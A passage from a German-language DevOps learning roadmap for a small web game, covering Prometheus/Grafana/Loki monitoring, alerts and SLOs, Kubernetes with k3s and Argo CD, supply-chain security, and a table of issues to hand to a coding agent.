  (Anfragen pro Sekunde, Speicher). **Traces:** Weg einer Anfrage durch Komponenten (später).
- **Prometheus** holt Metriken per HTTP von *Targets* ab (*Pull*/*Scrape*), speichert sie als
  Zeitreihen und wertet Regeln aus. **Exporter** liefern Metriken für Dinge, die selbst keine
  haben: `node_exporter` (Server: CPU, RAM, Disk), `cAdvisor` (Container).
- **Grafana** zeigt Dashboards aus Prometheus (Metriken) und **Loki** (Logs).
  **Grafana Alloy** sammelt Logs ein und schickt sie an Loki.
- **Alertmanager** verschickt Alarme (Mail, ntfy, Discord) und fasst sie zusammen.
- **RED-Methode** für Dienste: **R**ate, **E**rrors, **D**uration. **USE** für Ressourcen:
  **U**tilization, **S**aturation, **E**rrors.
- **SLI/SLO:** SLI ist eine Messgröße („Anteil Anfragen ohne 5xx“), SLO das Ziel dafür
  („99,5 % über 30 Tage“). Das **Error Budget** ist der Rest (0,5 %).
- **Kardinalität:** Jede Kombination von Label-Werten ist eine eigene Zeitreihe. User-IDs
  oder volle URLs als Label sprengen Prometheus.

### 4.1 Server- und Container-Metriken

**Ziel:** Ein Grafana-Dashboard zeigt CPU, RAM, Disk und Container des Servers.

**Aufgaben**
- [ ] Monitoring-Stack als eigene Compose-Datei (`deploy/monitoring/`): Prometheus,
      node_exporter, cAdvisor, Grafana. Daten in Volumes.
- [ ] Grafana **nicht** öffentlich ohne Login: entweder nur per SSH-Tunnel oder hinter Caddy
      mit eigener Subdomain und starkem Passwort.
- [ ] Fertiges Node-Exporter-Dashboard importieren, danach **ein eigenes** mit 4 Panels bauen.
- [ ] Prometheus-Konfiguration und Grafana-Datenquellen als Dateien im Repo (*provisioning*),
      nicht in der Oberfläche zusammengeklickt.

**Hinweise**
- Prometheus-Retention begrenzen, sonst läuft die Disk voll. Stichwort `retention.time`.
- Der CX23 ist klein. Beobachte nach dem Start, wie viel RAM der Stack selbst braucht.
- SSH-Tunnel: `ssh -L <lokal>:localhost:<remote> <server>`.

**Fertig, wenn:** Du startest auf dem Server `stress` oder eine Endlosschleife, und die CPU-Kurve
im eigenen Dashboard steigt.

### 4.2 Logs mit Loki

**Ziel:** Die JSON-Logs der App sind in Grafana durchsuchbar.

**Aufgaben**
- [ ] Loki und Alloy zum Monitoring-Stack, Alloy liest die Docker-Logs.
- [ ] In Grafana eine Abfrage: alle Log-Zeilen mit `level=ERROR` der letzten 24 h.
- [ ] Issue an den Agent: `/healthz`-Aufrufe nicht loggen (Abschnitt 8). Probes fluten die Logs.

**Hinweis:** LogQL hat einen `json`-Parser, mit dem du Felder aus den slog-Zeilen filtern kannst.

**Fertig, wenn:** Du provozierst einen Fehler (z. B. Login mit kaputtem Formular-Body) und
findest die Zeile in Grafana in unter einer Minute.

### 4.3 App-Metriken

**Ziel:** Prometheus kennt Anfragen, Fehler und Latenz der App sowie Spielzahlen.

**Aufgaben**
- [ ] Issue an den Agent: `/metrics`-Endpunkt (Abschnitt 8). Du lieferst die Liste der
      gewünschten Metriken mit Typ und Labels. Das ist deine Aufgabe, nicht seine.
- [ ] `/metrics` darf nicht über Caddy nach außen. Prometheus holt intern.
- [ ] Dashboard „Studigame“: Anfragen pro Route, Fehlerquote, p95-Latenz, gestartete Aktionen
      pro Art.

**Hintergrund zur Metrik-Liste:** **Counter** zählt nur hoch (Anfragen gesamt). **Gauge**
geht hoch und runter (aktive Sessions). **Histogram** verteilt Werte auf Buckets (Latenz),
daraus rechnet man Perzentile wie p95.

**Fertig, wenn:** Du lädst die Seite 50-mal neu und siehst die Rate im Dashboard steigen.

### 4.4 Alerts und SLOs

**Ziel:** Wenn etwas Wichtiges kaputt ist, klingelt dein Handy. Sonst nicht.

**Aufgaben**
- [ ] SLOs festlegen und in `docs/operations.md` begründen, z. B.: 99,5 % der Anfragen ohne
      5xx über 30 Tage, p95 unter 300 ms, letztes Backup jünger als 26 h.
- [ ] Alertmanager mit ntfy (App aufs Handy) oder Mail.
- [ ] 3–4 Alert-Regeln: App nicht erreichbar, Fehlerquote hoch, Disk über 80 %, Backup zu alt.
- [ ] Jeder Alert verlinkt ein Runbook.
- [ ] Externer Uptime-Check (z. B. ein kostenloser Uptime-Dienst), weil ein toter Server
      seinen eigenen Ausfall nicht melden kann.

**Hinweis:** „Backup zu alt“ braucht eine Metrik mit dem Zeitstempel des letzten Backups.
node_exporter hat einen *textfile collector*, in den dein Backup-Skript schreiben kann.

**Fertig, wenn:** Du stoppst den App-Container, und innerhalb von 5 Minuten kommt eine
Nachricht aufs Handy. Nach dem Start kommt die Entwarnung.

**Stolperfalle:** Zu viele Alerts machen taub. Regel: Alarm nur, wenn ein Mensch sofort
handeln muss. Alles andere ist ein Dashboard.

**Doku:** prometheus.io/docs (Getting started, Alerting), grafana.com/docs, sre.google
(SRE Book, Kapitel „Monitoring Distributed Systems“ und „Service Level Objectives“).

**Interview:** „Was würdest du bei einem Webdienst überwachen, und wann alarmierst du?“

---

## Phase 5: Kubernetes und GitOps

Hier wird aus deinem CKAD-Wissen Betriebswissen. Parallel lernst du für die **CKA**.
**Die Produktion bleibt auf Compose**, bis Kubernetes stabil läuft. Experimente laufen
auf einem Staging-Cluster.

**Hintergrund für die ganze Phase**
- **k3s:** schlanke, zertifizierte Kubernetes-Distribution, ein Binary, gut für einen
  einzelnen kleinen Server. Bringt Traefik als Ingress-Controller mit.
- **Deployment-Strategie bei SQLite:** SQLite verträgt genau einen Schreiber. Ein
  RollingUpdate startet den neuen Pod, bevor der alte weg ist: zwei Pods auf derselben
  Datenbank. Deshalb `replicas: 1` und `strategy: Recreate`, Volume `ReadWriteOnce`.
  Das ist die wichtigste Designentscheidung dieser Phase. Schreib sie als ADR auf.
- **Kustomize:** gemeinsame Basis-Manifeste plus kleine Abweichungen pro Umgebung
  (*Overlays*). **Helm:** Paketmanager für fertige Anwendungen (cert-manager, Argo CD, Prometheus).
- **cert-manager** besorgt Zertifikate (ersetzt Caddy). **Ingress** leitet HTTP(S) an Services.
- **GitOps mit Argo CD:** Der Cluster zieht sich seinen Sollzustand selbst aus Git (*Pull*).
  Die CI braucht keine Cluster-Zugangsdaten mehr. Rollback = Git-Revert.

### 5.1 Lokal mit kind oder k3d

**Ziel:** Studigame läuft in einem lokalen Cluster.

**Aufgaben**
- [ ] `deploy/k8s/base/`: Namespace, Deployment, Service, PVC, ConfigMap, Secret (lokal mit
      Dummy-Werten).
- [ ] Probes: liveness auf `/healthz`, readiness auf `/readyz` (Issue an den Agent, Abschnitt 8).
- [ ] `resources.requests/limits` setzen und begründen.
- [ ] `securityContext`: nicht als root, Dateisystem read-only (was muss beschreibbar
      bleiben?), Capabilities weg.
- [ ] `kubeconform` und `trivy config` auf die Manifeste in der CI.

**Fertig, wenn:** `kubectl port-forward` → Seite lädt. `kubectl delete pod …` → neuer Pod,
Daten noch da.

**Stolperfalle:** Mit `readOnlyRootFilesystem` braucht jedes Verzeichnis, in das die App
schreibt (Datenbank, ggf. `/tmp`), ein eigenes Volume.

### 5.2 Kaputt machen und reparieren

**Ziel:** Echtes Debugging-Zutrauen, genau das, was dir nach dem CKAD fehlt.

Jeden Fehler einbauen, Symptome ansehen, mit `kubectl describe`, `get events`, `logs`,
`logs --previous`, `exec` die Ursache finden, reparieren. Ins Lernlog.
- [ ] falsches Image-Tag (ImagePullBackOff)
- [ ] App stürzt beim Start ab (CrashLoopBackOff), z. B. fehlende Env-Var
- [ ] readiness-Probe auf falschem Pfad (Pod läuft, bekommt aber keinen Traffic)
- [ ] Memory-Limit zu klein (OOMKilled)
- [ ] Service-Selector passt nicht zum Pod-Label (Service ohne Endpoints)
- [ ] PVC findet keine StorageClass (Pending)

**Fertig, wenn:** Du findest jeden der sechs Fehler in unter 5 Minuten, ohne nachzuschlagen.
Das ist gleichzeitig CKA-Training.

### 5.3 k3s auf einem zweiten VPS (Staging)

**Ziel:** Ein echter Cluster mit TLS, provisioniert über deinen Code aus Phase 3.

**Aufgaben**
- [ ] Zweiten Server per OpenTofu, k3s per Ansible installieren 🙋.
- [ ] `kubeconfig` sicher auf den Mac holen, API-Port nur für deine IP öffnen.
- [ ] cert-manager per Helm, `ClusterIssuer` für Let's Encrypt (erst *staging*-Endpunkt,
      dann *prod*, wegen Rate-Limits).
- [ ] Ingress für `staging.<deinedomain>`.
- [ ] Kustomize-Overlays `staging` und `prod`.

**Fertig, wenn:** `https://staging.<deinedomain>` läuft mit gültigem Zertifikat aus dem Cluster.

### 5.4 Secrets richtig

**Ziel:** Keine Klartext-Secrets in Git, trotzdem alles deklarativ.

**Hintergrund:** Kubernetes-Secrets sind nur Base64, nicht verschlüsselt. Zwei verbreitete
Wege: **SOPS + age** (Dateien verschlüsselt im Repo, Entschlüsselung beim Deploy) oder
**Sealed Secrets** (Controller im Cluster entschlüsselt). In Firmen oft **External Secrets**
mit Vault oder Cloud-Secret-Manager (Awareness).

**Aufgaben:** einen Weg wählen, ADR schreiben, SMTP-Zugangsdaten so ablegen.

**Fertig, wenn:** `git grep` findet kein Passwort im Klartext, und der Pod hat die Werte.

### 5.5 GitOps mit Argo CD

**Ziel:** Ein Merge auf `main` landet automatisch auf Staging, Produktion nach Freigabe.

**Aufgaben**
- [ ] Argo CD per Helm installieren, UI nur per Port-Forward.
- [ ] `Application` für Staging, beobachtet `deploy/k8s/overlays/staging`.
- [ ] CI nach dem Image-Push: schreibt den neuen Digest per Commit ins Staging-Overlay.
- [ ] Release-Tag: PR, der den Digest im Prod-Overlay setzt. Merge = Freigabe.

**Fertig, wenn:** Du mergst eine sichtbare Textänderung, und ohne weiteres Zutun steht sie
wenige Minuten später auf Staging. Ein `git revert` nimmt sie wieder zurück.

### 5.6 Backup im Cluster mit Litestream

**Ziel:** Kontinuierliches DB-Backup in Object Storage, Restore beim Start.

**Hintergrund:** **Litestream** läuft als *Sidecar* neben der App im selben Pod und
repliziert die SQLite-Änderungen laufend in einen Bucket. Ein *Init-Container* kann beim Start
aus dem Bucket wiederherstellen, falls das Volume leer ist. RPO sinkt von 24 h auf Sekunden.

**Fertig, wenn:** PVC löschen, Pod neu starten, Daten sind wieder da.

### 5.7 Produktion umziehen (optional)

Erst, wenn Staging zwei Wochen ohne Eingriff lief. Sonst bleibt Compose produktiv, das ist
für ein Spiel dieser Größe die vernünftige Wahl, und genau diese Abwägung ist ein gutes
Interview-Thema.

**Interview:** „Wann ist Kubernetes für ein Projekt zu viel?“

---

## Phase 6: DevSecOps und Betrieb vertiefen

Kein fester Ablauf. Nimm dir pro Woche einen Punkt.

**Lieferkette (Supply Chain)**
- [ ] **SBOM** (Software Bill of Materials, Liste aller Bestandteile) beim Image-Build
      erzeugen und anhängen.
- [ ] Images mit **cosign** keyless signieren (über GitHub OIDC, kein Schlüssel zu verwalten).
- [ ] **Provenance** (Nachweis, wo und wie gebaut wurde) per `actions/attest-build-provenance`.
- [ ] Im Cluster: **Kyverno**-Regeln: nur signierte Images, kein `latest`, Limits Pflicht.

**Anwendung und Cluster**
- [ ] `docs/threat-model.md`: eine Seite, Datenflussbild, pro Grenze die STRIDE-Fragen
      (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service,
      Elevation of Privilege).
- [ ] `SECURITY.md`: wie man Lücken meldet.
- [ ] **CodeQL** im PR.
- [ ] **OWASP ZAP** Baseline-Scan nächtlich gegen Staging.
- [ ] **NetworkPolicy:** standardmäßig alles verboten, erlaubt nur DNS, SMTP, Object Storage.
- [ ] Pod Security Admission `restricted` für den Namespace.

**Betrieb**
- [ ] **Game Days** auf Staging: Pod mitten in einer Schicht killen, kaputtes Image deployen,
      TLS-Secret löschen, Disk volllaufen lassen. Jeweils: Wie merkst du es? Wie lange bis
      repariert?
- [ ] Nach jedem echten Vorfall ein **Postmortem** ohne Schuldzuweisung
      (`docs/postmortems/`): Auswirkung, Zeitlinie, Ursache (5× Warum), Maßnahmen als Issues.
- [ ] **DORA-Metriken** monatlich in `docs/metrics.md`: Deploy-Häufigkeit, Durchlaufzeit,
      Fehlerquote nach Änderungen, Wiederherstellungszeit.
- [ ] **Renovate oder Dependabot** auch für Docker-Images und Helm-Charts.

**Doku:** OWASP Top 10 und Cheat Sheets, slsa.dev, sigstore.dev, kyverno.io, sre.google.

---

## Nebenstrang: Öffentlich schalten 🙋

Unabhängig vom Lernpfad. Erst nötig, wenn fremde Menschen die Seite nutzen.

- [ ] **Impressum** (§ 5 DDG) und **Datenschutzerklärung** (Art. 13 DSGVO), sobald die Seite
      öffentlich verlinkt ist und E-Mails sammelt.
- [ ] Kein Cookie-Banner nötig, solange kein Tracking läuft und alle Fonts/Skripte selbst
      gehostet sind (§ 25 TDDDG).
- [ ] **Mailversand:** Anbieter (Brevo, Postmark, SES), **SPF, DKIM, DMARC** im DNS, sonst
      landen Bestätigungsmails im Spam. Danach SMTP-Zugangsdaten einmal komplett rotieren und
      `docs/runbooks/rotate-smtp.md` schreiben.
- [ ] `SITE_DOMAIN` auf die echte Domain, **HSTS** erst, wenn HTTPS sicher stabil läuft.
- [ ] Einmaliger Rechts-Check vor dem Bewerben der Seite. ⚠️ keine Rechtsberatung.

---

## 8. Issues für den Agent

Diese Punkte gehören in den Spielcode. Schreib sie als GitHub-Issue mit Akzeptanzkriterien.

| # | Issue | Gebraucht in | Akzeptanzkriterium (Vorschlag) |
|---|---|---|---|
| 8.1 | Versionsinfo ins Binary (`-ldflags -X`), Ausgabe auf `/healthz` oder im Footer | 2.1, 2.5 | `curl /healthz` zeigt Commit-SHA bzw. Tag |
| 8.2 | `/readyz` mit DB-Ping | 5.1 | liefert 503, wenn die DB nicht erreichbar ist |
| 8.3 | Health-Checks nicht loggen | 4.2 | `/healthz` und `/readyz` erzeugen keine Log-Zeile |
| 8.4 | Request-ID-Middleware (`X-Request-ID` übernehmen oder erzeugen, in jede Log-Zeile) | 4.2 | eine Anfrage ist über alle Log-Zeilen verfolgbar |
| 8.5 | `/metrics` (Prometheus): RED pro Routen-Muster, Business-Counter, ohne User-IDs als Label | 4.3 | Liste der Metriken kommt von dir. Neue Dependency per ADR begründen |
| 8.6 | `time/tzdata` einbetten, falls das Image auf distroless/scratch umgestellt wird | 1.5 | App startet ohne Zeitzonen-Datenbank im Image |

---

## Glossar (Kurzform)

| Begriff | Bedeutung |
|---|---|
| ADR | Architecture Decision Record: kurze Datei mit Kontext, Entscheidung, Alternativen, Folgen |
| Artefakt | unveränderliches Build-Ergebnis (Image, Binary, SBOM) |
| Digest | Hash eines Images, eindeutig und unveränderlich |
| Drift | Ist-Zustand weicht vom Code ab (jemand hat von Hand geändert) |
| Idempotent | mehrfach ausführen ergibt dasselbe Ergebnis wie einmal |
| Least Privilege | jeder bekommt nur die Rechte, die er wirklich braucht |
| Probe | Kubernetes fragt regelmäßig, ob ein Container lebt (liveness) oder Traffic will (readiness) |
| Runbook | Schritt-für-Schritt-Anleitung für eine Betriebsaufgabe, mit Datum „zuletzt getestet“ |
| Sidecar | zusätzlicher Container im selben Pod, der der App zuarbeitet |
| SLO | Ziel für die Zuverlässigkeit, z. B. 99,5 % erfolgreiche Anfragen |
| Smoke-Test | schneller Test nach dem Deploy: lebt die Anwendung überhaupt? |
| State (IaC) | Zuordnung zwischen Code und echten Ressourcen |
